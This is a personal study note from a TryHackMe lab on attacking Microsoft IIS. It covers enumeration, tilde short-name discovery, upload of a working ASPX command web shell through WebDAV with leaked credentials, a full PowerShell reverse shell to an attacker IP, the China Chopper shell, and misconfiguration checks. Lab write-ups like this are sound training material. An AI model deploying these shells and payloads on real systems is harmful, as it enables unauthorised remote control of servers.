https://tryhackme.com/room/webserverattacks2

### Table of contents
- [[#IIS]]
- [[#Fingerprinting & Enumeration]]
- [[#~Tilde Enumeration]]
- [[#WebDAV Exploitation -- ASPX Shell]]
- [[#ASPX Web Shells]]
- [[#IIS Misconfigurations]]
- [[#Automation -- NSE]]

___
### IIS
[[#Table of contents|Back to the top]]

Internet Information Services
- MS's web server platform, hosts websites, webapps, services (Exchange OWA, SharePoint, ADFS, ...)
- Logs HTTP requests in W3C format, recording client IPs, requested URIs, status codes, user agents
- Virtually on every Windows Server running a webapp, intranet portal, REST API

___
### Fingerprinting & Enumeration
[[#Table of contents|Back to the top]]

IIS version --> CVE
WebDAV present --> maybe direct file upload path

##### Version

| IIS Version   | Windows Server          | Status                                               |
| ------------- | ----------------------- | ---------------------------------------------------- |
| IIS 6.0       | Server 2003             | End of Life (July 2015). No patches issued post-EOL. |
| IIS 7.0 / 7.5 | Server 2008 / 2008 R2   | End of Life                                          |
| IIS 8.0 / 8.5 | Server 2012 / 2012 R2   | End of Life                                          |
| IIS 10.0      | Server 2016, 2019, 2022 | Current                                              |

##### Architecture

![[Pasted image 20260725103618.png|500]]

**HTTP.sys:** kernel-mode driver receives HTTP traffic before IIS --> CVE-2022-21907

**Application Pools:** isolation containers, each running its own `w3wp.exe` process under its own Windows identity, ASPX shell runs under that account context

IIS 7.5+: `ApplicationPoolIdentity` is default identity, virtual account named `IIS APPPOOL\<pool name>`. `ApplicationPoolIdentity` and `NETWORK SERVICE` carry `SeImpersonatePrivilege` by default --> Potato-style escalation

##### HTTP Banner Grabbing

Read response headers from
`curl -I http://10.130.175.183`

`X-AspNet-Version`: .NET framework version --> CVEs

##### WebDAV Detection -- OPTIONS

If [[WebDAV]] left enabled on directory with writing and execution permissions --> direct path to uploading shell

`curl -X OPTIONS http://10.130.175.183 -sv 2>&1 | grep -E "Allow:|DAV:"`
*informs whether WebDAV is active*

Response if DAV enabled:
`Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK DAV: 1,2,3`

##### Testing File Uploading & Execution

Use the WebDAV: `PUT`, `GET`, observe
	--> `200` means server executed/served

Test ASPX, no credentials required
```Shell
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://10.130.175.183/webdav/test.aspx
```
--> `401` on `PUT` confirms no write access
--> `401` on `GET` confirms execution

##### Suspicious VS Normal Traffic

|Pattern|Normal|Suspicious|
|---|---|---|
|HTTP methods|`GET`, `POST`, `HEAD`|`OPTIONS` returning `DAV:` header; `PUT`, `MOVE`, `PROPFIND`|
|URI paths|`.htm`, `.aspx`, `.js`, `.css`, static assets|Paths containing `~`; newly appeared `.aspx` files in writable directories|
|Status codes|200, 304, 301, 302, 404|201 Created (file uploaded via PUT); unexpected PUT or DELETE in logs|
|`Server` header|Present, matches expected version|Suppressed or reveals EOL version like `IIS/6.0`|

___
### ~Tilde Enumeration
[[#Table of contents|Back to the top]]

8.3 filename format from DOS (Disk Operating System): < 8 characters for name, < 3 for extension
Windows creates short 8.3 filenames and long filenames for every file created on [[NTFS]] volumes 

Conversion rule
- First **6** characters of long name
- Append **`~1`** (or `~2`, `~3` if more than one)
- First **3** characters of extension

IIS receives request with `~` in path --> processes it against 8.3 short name namespace
Match returns different status code than no match

Affects IIS 5.x - IIS 10.0
Recommended mitigation: disable 8.3 filename creation in Windows registry

##### `iis_shortname_scan.py`

`python3 iis_shortname_scan.py http://10.130.167.138/`
*2 example results: `/backup~1` and `/aspnet~1`*

##### Short Name Interpretation

|Short Name Discovered|Likely Full Name|Why It Matters|
|---|---|---|
|`BACKUP~1/`|`BackupFiles/`, `Backup_2024/`|Backup data, likely sensitive|
|`ADMINI~1/`|`AdminInterface/`, `Administration/`|Admin panel, restricted access|
|`CONFIG~1.ASP`|`configuration.asp`, `config_old.asp`|The configuration file may contain credentials|
|`USERS_~1.XLS`|`users_backup.xlsx`|User data export, high value target|

##### Enumerate Directory

IIS doesn't serve content via short name URL path directly --> try to guess long name: `/backup/`, `/BackupFiles/`, `/backup_data/`, ... / use wordlist against confirmed 6-character prefix

`curl http://10.130.167.138/BackupFiles/`

`curl http://10.130.167.138/BackupFiles/webdav_notes.txt`
`webdav_user:P@ssw0rd!123`

___
### WebDAV Exploitation -- ASPX Shell
[[#Table of contents|Back to the top]]

In [[#Testing File Uploading & Execution]], `PUT` returned `401` meaning no writing permission
In [[#~Tilde Enumeration]], we found credentials which could give us writing permission

Success conditions
- **WebDAV** enabled
- Valid **credentials** with **Write** permission
- **Script Execute** is set, IIS passes **`.aspx`** request to ASP.NET handler, doesn't serve them as static content

`cmd.aspx`
```aspx
<​%@ Page Language="C#" %​> <​% string cmd = Request.QueryString["cmd"]; if (!string.IsNullOrEmpty(cmd)) { var proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "/c " + cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>"); } %​>
```
*accepts `cmd` parameter, runs it through `cmd.exe`, returns output*

Anonymous, unauthenticated users only have read permission (`GET`) --> authenticate

```Shell
curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://10.130.167.138/webdav/cmd.aspx
```
*`PUT` `cmd.aspx` directly inside `/webdav` directory*
*`--ntlm` flag is used for authentication ([[NTLM]])*

`curl "http://10.130.167.138/webdav/cmd.aspx?cmd=whoami"`

___
### ASPX Web Shells
[[#Table of contents|Back to the top]]

ASPX web shell: ASP.NET file hosted on web server which accepts attacker input via HTTP and executes it under server process

Code is executed inside `w3wp.exe` (IIS worker process), runs under Application Pool identity
Application Pool determines what shell can do
`ApplicationPoolIdentity` (IIS 7.5+ default) limited system access but inherits `SeImpersonatePrivilege`
Domain Admin / `SYSTEM` --> high privilege

##### 1. Execute Commands

```Shell
curl "http://10.130.167.138/webdav/cmd.aspx?cmd=whoami"
```

Returns `<pre>iis apppool\defaultapppool </pre>`
--> app is running under Application Pool identity

```Shell
curl "http://10.130.167.138/webdav/cmd.aspx?cmd=hostname"
curl "http://10.130.167.138/webdav/cmd.aspx?cmd=ipconfig"
curl "http://10.130.167.138/webdav/cmd.aspx?cmd=dir+C:\\"
```

##### 2. Escalate to Reverse Shell

Start Netcat on attacker machine
```Shell
nc -lvnp 443
```
NB: `443` is HTTPS port, outbound HTTPS traffic almost never blocked by enterprise firewalls

PS reverse shell
```Powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -c ` "$client = New-Object System.Net.Sockets.TCPClient('{10.130.116.123}',443);` $stream = $client.GetStream();` [byte[]]$bytes = 0..65535|%{0};` while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){` $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);` $sendback = (iex $data 2>&1 | Out-String );` $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';` $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);` $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};` $client.Close()""
```

Pass it through ASPX shell
```Shell
curl -G "http://10.130.167.138/webdav/cmd.aspx" --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('"'"'10.130.116.123'"'"',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```

##### 3. Confirm Privileges

`whoami`, `whoami /priv`
--> `SeImpersonatePrivilege`: allows process to impersonate any user who connects to it at Windows token level

Potato-style tools: force SYSTEM-level process to authenticate to attacker-controlled named pipe, use `SeImpersonatePrivilege` to steal SYSTEM token from that authentication

##### Real-World ASPX Shell -- China Chopper

```ASP.NET
<​%@ Page Language="Jscript"%​><​%eval(Request.Item["chopper"],"unsafe");%​>
```

Defenders should look for 73 bytes and `eval(` pattern

___
### IIS Misconfigurations
[[#Table of contents|Back to the top]]

Most common IIS attack surface

##### 1. Directory Listing Enabled
No `index.html`/`default.aspx`, `Directory Browsing` enabled --> IIS renders file listing
`curl http://10.130.167.138/uploads/`
Priority targets: `.bak`, `.config`, `.log`, `.zip`, `.sql` (shouldn't be publicly available)

##### 2. Unauthenticated HTTP PUT & DELETE
`curl -X OPTIONS http://10.130.167.138/ -sv 2>&1 | grep "Allow:"`

##### 3. Exposed `web.config`
Contains database connection strings, API keys, SMTP credentials, encryption keys, application settings
`curl http://10.130.167.138/web.config`

##### 4. Verbose Error Messages
Development mode IIS returns full .NET stack traces (internal file paths, .NET framework version, failed database query, server's internal IP, ...)
--> going live --> in `web.config`,
```XML
<system.web>
	<customErrors mode="On" />
</system.web>
```
--> generic error page

##### 5. Enabled `trace.axd`
Built-in diagnostic handler, can include HTTP headers, form values, session state, cookies, internal timing data for every recent request to application
`curl http://10.130.167.138/trace.axd`
Should be disabled in `web.config`: `<trace enabled="false"/>`
`200` is already a finding

##### 6. Enabled TRACE Method
HTTP method, echoes incoming request back
`curl -X TRACE http://10.130.167.138 -sv`
`200` is already a finding

##### 7. Application Pool Running as Privileged Account
`curl "http://10.130.167.138/webdav/cmd.aspx?cmd=whoami"`
--> `nt authority\system` / domain admin username

___
### Automation -- NSE
[[#Table of contents|Back to the top]]

Nmap Scripting Engine

##### 1. Service Version Detection
`nmap -sV -p 80 10.130.167.138`

##### 2. HTTP Methods Enumeration
`nmap --script http-methods -p 80 10.130.167.138`

##### 3. WebDAV Detection
`nmap --script http-webdav-scan -p 80 10.130.167.138`
Confirmed by WebDAV-specific verbs in `Public Options` line (`PROPFIND`, `PROPPATCH`, `MKCOL`, `COPY`, `MOVE`, `LOCK`, `UNLOCK`)

##### 4. Authentication Requirements
`nmap --script http-ntlm-info --script-args http-ntlm-info.root=/webdav/ -p 80 10.130.167.138`

|Script|What It Does|
|---|---|
|`http-methods`|Sends an OPTIONS request and parses the `Allow:` header to list permitted methods|
|`http-webdav-scan`|Probes for WebDAV support and retrieves the server's DAV headers|
|`http-iis-webdav-vuln`|Tests for IIS WebDAV authentication bypass (CVE-2009-1535, affects IIS 5 and 6)|
|`http-ntlm-info`|Sends an `NTLM` authentication request to a given path and extracts target information from the NTLM challenge response.|



___
